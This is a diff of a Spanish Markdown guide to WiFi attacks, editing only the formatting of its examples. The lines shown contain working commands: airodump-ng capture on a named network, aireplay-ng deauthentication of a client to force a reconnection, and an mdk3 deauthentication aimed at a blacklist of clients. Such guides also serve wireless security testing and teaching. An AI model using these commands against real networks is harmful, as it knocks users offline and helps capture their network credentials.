@@ -156,7 +156,7 @@ SINOPSIS: Expulsaremos un cliente conectado a una red , para forzar que conecte 
 
 ``` $ airodump-ng -c 1 -w Captura --essid MovistarE34A wlan0mon ```
 
---En otra consola , procedemos a desautenticar al cliente visitar **1 para entender parametros 
+--En otra consola , procedemos a desautenticar al cliente visitar  
 
 ``` $ aireplay-ng -0 10 -e MovistarE34A -c MACDELCLIENTE wlan0mon ```
 
@@ -217,10 +217,12 @@ SINOPSIS: Aqui el objetivo es saturar el espectro de onda (canal de comunicacion
 SINOPSIS: Es otro tipo de ataque de disasociacion dirigido a una lista de clientes de un 
         AP , seria como el global pero eligiendo varios clientes selectivamente 
 
-```
-    $ nano blacklist    y dentro copiamos los clientes ESTATIONS a desautentificar
-    $  mdk3 wlan0mon d -w blacklist -c 1 
-```
+```  $ nano blacklist   ``` 
+
+Y dentro copiamos los clientes ESTATIONS a desautentificar
+
+```  $  mdk3 wlan0mon d -w blacklist -c 1 ```
+
 
 [Subir](#top)
 
